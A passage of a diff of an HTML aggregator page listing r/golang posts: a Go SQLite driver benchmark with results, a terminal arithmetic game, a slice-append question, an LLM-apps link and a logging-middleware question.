href="https://gitlab.com/cznic/sqlite/-/issues?sort=created_date&amp;state=opened&amp;search=prepared&amp;first_page_size=20&amp;show=eyJpaWQiOiIyMzYiLCJmdWxsX3BhdGgiOiJjem5pYy9zcWxpdGUiLCJpZCI6MTc3OTgwMjkzfQ%3D%3D">Optimize prepared statements?</a> reporting this same behavior.</p> <p>I researched and could not find any workarounds. I attempted a few on my on. None worked.</p> <p>I knew from past experiences that I could use mattn/go-sqlite3, but I wanted a non-CGO solution. I used kimi-cli with Kimi K2.5 to write <a href="https://github.com/lbe/sqlite-read-benchmark">sqlite-read-benchmark</a> to test the exact pattern with some of the most popular Go SQLite drivers. The results, shown at the end of this post, were consistent with my earlier observations on modernc.org/sqlite. I received a pleasant surprise that <a href="https://pkg.go.dev/ncruces/go-sqlite3">ncruces/go-sqlite3</a> was over 5 times faster and second only to <a href="https://pkg.go.dev/crawshaw.io/sqlite">crawshaw.io/sqlite</a> which about 10 times faster.</p> <p>I do not have much experience with WASM and have previously not attempted to use <a href="https://pkg.go.dev/ncruces/go-sqlite3">ncruces/go-sqlite3</a> because of that. The replacement was fairly smooth, some syntax differences for the DSN string and then some differences in integration and E2E testing having to do with startup times. Nothing major. I was again pleasantly surprised when my application step that previously took 33 minutes was reduced to 1 minute.</p> <p>I wanted to share this experience with others who may be similarly hesitant to give <a href="https://pkg.go.dev/ncruces/go-sqlite3">ncruces/go-sqlite3</a> a try. </p> <p><a href="/u/ncruces">u/ncruces</a>, <strong>Thank You</strong> for your contributions!</p> <p>lbe</p> <p>Benchmark Results</p> <pre><code>SQLite Driver Benchmark Suite ============================== Database: benchmark.db Reads: 100000 Goroutines: 22 === mattn/go-sqlite3 === Running raw benchmark... raw (22 goroutines): 100000 reads in 4.198395945s = 23819 reads/sec Running prepared benchmark... prepared (22 goroutines): 100000 reads in 2.319155183s = 43119 reads/sec ✓ mattn/go-sqlite3 completed === modernc.org/sqlite === Running raw benchmark... raw (22 goroutines): 100000 reads in 4.37563765s = 22854 reads/sec Running prepared benchmark... prepared (22 goroutines): 100000 reads in 4.154677353s = 24069 reads/sec ✓ modernc.org/sqlite completed === github.com/ncruces/go-sqlite3 === Running raw benchmark... raw (22 goroutines): 100000 reads in 713.712971ms = 140112 reads/sec Running prepared benchmark... prepared (22 goroutines): 100000 reads in 626.007348ms = 159743 reads/sec ✓ github.com/ncruces/go-sqlite3 completed === crawshaw.io/sqlite === Running raw benchmark... raw (22 goroutines): 100000 reads in 3.376629975s = 29615 reads/sec Running prepared benchmark... prepared (22 goroutines): 100000 reads in 403.347256ms = 247925 reads/sec ✓ crawshaw.io/sqlite completed === zombiezen.com/go/sqlite === Running raw benchmark... raw (22 goroutines): 100000 reads in 14.656310718s = 6823 reads/sec Running prepared benchmark... prepared (22 goroutines): 100000 reads in 2.482263816s = 40286 reads/sec ✓ zombiezen.com/go/sqlite completed === github.com/glebarez/sqlite === Running raw benchmark... raw (22 goroutines): 100000 reads in 4.924050485s = 20308 reads/sec Running prepared benchmark... prepared (22 goroutines): 100000 reads in 6.02162578s = 16607 reads/sec ✓ github.com/glebarez/sqlite completed ============================== Benchmark complete! </code></pre> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/LearnedByError"> /u/LearnedByError </a> <br/> <span><a href="https://www.reddit.com/r/golang/comments/1r5oza8/issue_moderncorgsqlite_reprepares_statements/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/golang/comments/1r5oza8/issue_moderncorgsqlite_reprepares_statements/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/golang/comments/1r750rs/i_built_a_terminal_arithmetic_game_in_go/" target="_blank">I built a terminal arithmetic game in Go</a>
+            <div class="item-content"><table> <tr><td> <a href="https://www.reddit.com/r/golang/comments/1r750rs/i_built_a_terminal_arithmetic_game_in_go/">  </a> </td><td> <!-- SC_OFF --><div class="md"><p>I built ArithmeGo, a terminal-based arithmetic game using Bubble Tea and Cobra. It covers basic arithmetic, powers and roots, and advanced operations like modulo and factorials. Five difficulty levels from beginner to expert. Timed sprints with scoring and streaks, or untimed practice at your own pace. All progress tracked locally.</p> <p>The idea came from waiting on AI agents to finish long tasks. Instead of alt-tabbing to my phone, I wanted something useful right in the terminal.</p> <p>The entire codebase was written using Claude Code. Feel free to roast the code, no hard feelings.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/gurselcakar"> /u/gurselcakar </a> <br/> <span><a href="https://github.com/gurselcakar/arithmego">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/golang/comments/1r750rs/i_built_a_terminal_arithmetic_game_in_go/">[comments]</a></span> </td></tr></table></div>
+          </li>
+  
+          <li>
+            <a href="https://www.reddit.com/r/golang/comments/1r74f6t/explain_this_plz/" target="_blank">explain this plz</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>func main() {</p> <pre><code>a1 := make([]int, 0, 0) a1 = append(a1, []int{1, 2, 3, 4, 5}...) a2 := append(a1, 6) a3 := append(a1, 7) fmt.Println(a1, a2, a3) </code></pre> <p>}</p> <p>print:</p> <pre><code>[1 2 3 4 5] [1 2 3 4 5 7] [1 2 3 4 5 7] </code></pre> <p>why it prints a2 as [1 2 3 4 5 7] instaed of [1 2 3 4 5 6]?<br/> shouldnt a1, a2 and a3 have different memories?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/Several-Mess2288"> /u/Several-Mess2288 </a> <br/> <span><a href="https://www.reddit.com/r/golang/comments/1r74f6t/explain_this_plz/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/golang/comments/1r74f6t/explain_this_plz/">[comments]</a></span></div>
+          </li>
+  
+          <li>
+            <a href="https://www.reddit.com/r/golang/comments/1r71sxj/building_llmpowered_applications_in_go/" target="_blank">Building LLM-powered applications in Go</a>
+            <div class="item-content"><table> <tr><td> <a href="https://www.reddit.com/r/golang/comments/1r71sxj/building_llmpowered_applications_in_go/">  </a> </td><td> <!-- SC_OFF --><div class="md"><p>I came across this doing some research and realize it&#39;s never been published on the reddit. I&#39;m looking to do a spin on RAG for GPU poor setups using the smaller ollama models (or llama-server these days) and may be looking at genkit to squeeze some juice from my aging hardware. Mainly things that track some of my data sources and try to act from a scheduler, like getting a plant watering text message or some other maintenance tasks that depend on input (weather) to provide output. Yes I could probably code a loop over a log of rain data, but also I can feed those 7 lines to a 1B model and wait 2 minutes for a response and measure which model is mostly correct in it&#39;s evaluations :)</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/titpetric"> /u/titpetric </a> <br/> <span><a href="https://go.dev/blog/llmpowered">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/golang/comments/1r71sxj/building_llmpowered_applications_in_go/">[comments]</a></span> </td></tr></table></div>
+          </li>
+  
+          <li>
+            <a href="https://www.reddit.com/r/golang/comments/1r71qvf/middleware_for_print_static_files_accessed_from/" target="_blank">Middleware for print static files accessed from embed directory</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I want add to Go net/http app simple printing information about calling routes, so I use code:</p> <p><code>func informationMiddleware(next http.Handler) http.Handler {</code><br/> <code>return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {</code><br/> <code>var info string</code><br/> <code>info += &quot;[&quot; + r.Method + &quot;] &quot; + r.URL.Path + &quot; &quot;</code><br/> <code>info += &quot;From: &quot; + r.RemoteAddr + &quot; to: &quot;</code><br/> <code>info +=</code> <a href="http://r.Host"><code>r.Host</code></a> <code>+ &quot; &quot;</code><br/> <code>dprint(info)</code> </p> <p><code>next.ServeHTTP(w, r)</code><br/> <code>})</code><br/> <code>}</code></p> <pre><code>func dprint(text string) { fmt.Printf(&quot;[&quot;+time.Now().Format(&quot;2006.01.02 15:04:05.0000000&quot;)+&quot;] %s\n&quot;, text) } </code></pre> <p>inside:</p> <p><code>mux := http.NewServeMux()</code><br/> <code>mux.Handle(&quot;/static/&quot;, http.StripPrefix(&quot;/static/&quot;, fileServer))</code><br/> <code>log.Fatal(http.ListenAndServe(port, informationMiddleware(mux)))</code> </p> <p>Problem is - how extend informationMiddleware to get information printed to console about static files accesses like calling for favicons, CSS/JS files and similar?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/pepiks"> /u/pepiks </a> <br/> <span><a href="https://www.reddit.com/r/golang/comments/1r71qvf/middleware_for_print_static_files_accessed_from/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/golang/comments/1r71qvf/middleware_for_print_static_files_accessed_from/">[comments]</a></span></div>
           </li>
   
         </ul>
   
+      </div>
+  
+      <div class="card">
+        <h2>Movie Trailers</h2>
+        <ul class="item-list">
+  
+          <li>
+            <a href="http://www.filmjabber.com/movie-trailers/star-wars-the-mandalorian-grogu.html" target="_blank">Star Wars: The Mandalorian & Grogu Movie Trailer</a>
+            
+          </li>
+  
+        </ul>
       </div>
   
     </div>
